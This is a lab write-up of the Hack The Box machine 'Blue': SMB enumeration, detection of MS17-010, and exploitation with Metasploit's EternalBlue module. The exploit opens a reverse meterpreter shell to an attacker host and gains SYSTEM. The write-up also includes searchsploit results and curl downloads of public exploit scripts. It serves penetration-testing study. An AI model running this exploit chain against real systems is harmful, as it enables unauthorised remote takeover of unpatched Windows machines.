#windows 
# Enumeration

## nmap port scanning
```
nmap -sC -sV blue.htb                                             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 20:36 EST
Nmap scan report for blue.htb (10.129.232.51)
Host is up (0.18s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-27T01:38:17
|_  start_date: 2023-02-27T00:46:05
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-27T01:38:16+00:00
|_clock-skew: mean: 6s, deviation: 1s, median: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.28 seconds
```

## smb port 445
### SMBMap
```
smbmap -H blue.htb 
[+] IP: blue.htb:445    Name: unknown     
```

### SMBMap with random creds
```
smbmap -H blue.htb -u "tofu" -p ""
[+] Guest session       IP: blue.htb:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
```

### Crackmapexec
```
crackmapexec smb blue.htb  
SMB         blue.htb        445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
```

### SBMClient
```
smbclient -N -L blue.htb 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to blue.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

#### Share
```
smbclient //blue.htb/Share        
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                4692735 blocks of size 4096. 657924 blocks available
```

#### Users
```
smbclient //blue.htb/Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                4692735 blocks of size 4096. 657924 blocks available
```


## EternalBlue
```
nmap -p 445 -script vuln blue.htb                                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 21:41 EST
Nmap scan report for blue.htb (10.129.232.51)
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

## Metasploit

### msfconsole
```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

### meterpreter
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set Rhosts 10.129.232.51
Rhosts => 10.129.232.51
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.4
lhost => 10.10.14.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.129.232.51:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.232.51:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.232.51:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.232.51:445 - The target is vulnerable.
[*] 10.129.232.51:445 - Connecting to target for exploitation.
[+] 10.129.232.51:445 - Connection established for exploitation.
[+] 10.129.232.51:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.232.51:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.232.51:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.232.51:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.232.51:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.232.51:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.232.51:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.232.51:445 - Sending all but last fragment of exploit packet
[*] 10.129.232.51:445 - Starting non-paged pool grooming
[+] 10.129.232.51:445 - Sending SMBv2 buffers
[+] 10.129.232.51:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.232.51:445 - Sending final SMBv2 buffers.
[*] 10.129.232.51:445 - Sending last fragment of exploit packet!
[*] 10.129.232.51:445 - Receiving response from exploit packet
[+] 10.129.232.51:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.232.51:445 - Sending egg to corrupted connection.
[*] 10.129.232.51:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.129.232.51
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.232.51:49159) at 2023-02-27 00:39:20 -0500
[+] 10.129.232.51:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.232.51:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.232.51:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

### Shell
```
meterpreter > shell
Process 1776 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Flags
```
C:\Users\haris\Desktop>type user.txt
type user.txt
```

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
```


### Searchsploit
```searchsploit ms17-010     
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSyne | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Sca | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB R | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalB | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2F | windows_x86-64/remote/41987.py
-------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Prepare tools
https://rizemon.github.io/posts/blue-htb/

```
mkdir eternalblue
curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py > eternalblue/send_and_execute.py
curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py > eternalblue/mysmb.py
curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > eternalblue/checker.py
```

